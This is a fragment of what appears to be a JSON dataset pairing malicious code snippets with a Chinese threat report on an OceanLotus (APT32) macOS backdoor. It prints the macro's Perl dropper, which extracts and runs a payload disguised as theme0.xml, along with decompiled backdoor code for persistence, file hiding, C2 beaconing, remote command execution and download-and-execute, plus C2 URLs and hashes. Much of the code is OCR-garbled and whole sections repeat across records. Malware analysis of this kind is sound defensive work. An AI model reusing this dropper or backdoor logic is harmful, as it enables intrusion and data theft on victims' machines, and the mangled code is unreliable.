\n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "system(\"unzip\".$pathFile.\"-d\".$pathFolderFile);system(\"chmod+x\\\"\".$pathFolderFile.\"/word/theme/theme0.xml\\\"\");move(\"$pathFolderFile/word/theme/theme0.xml\",\"$pathFolderFile/word/theme/syslogd\");system(\"\\\"$pathFolderFile/word/theme/syslogd\\\"&\");system(\"rm-Rf/tmp/system\");system(\"rm/tmp/modern\");touch-t1407260241\\\"/Users/hep/Library/Spelling/spellagentd\\\">/dev/nullstd::string::string((std::string*)&v20,(conststd::string*)&v22);*(_DWORD*)(a1+29)=HandlePP::runCommand(&v20,(unsignedint)v2,&v21);std::string::string((std::string*)&v79,(conststd::string*)&v81);v49=removefile(&v79);v29=1;v5=(char*)&v153;pthread_create(&v84,&v153,respondLoadLunaThread,v44);v29=1;v5=(char*)&v153;pthread_create(&v84,&v153,respondRunTerminalThread,v44);v29=1;v5=(char*)&v153;pthread_create(&v84,&v153,respondUploadThread,v44);v29=1;v5=(char*)&v153;pthread_create(&v84,&v153,(void*(*)(void*))respondownloadThread,v44);", "hash_code": "65a7dcfa0c4c526f58e30c134026c236eb4ceebe15706af766994305d517506e", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "38 plain = (char *)get_plain((unsigned _int64 *)v2, v3, KEY, KEYLENGTH, 1);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 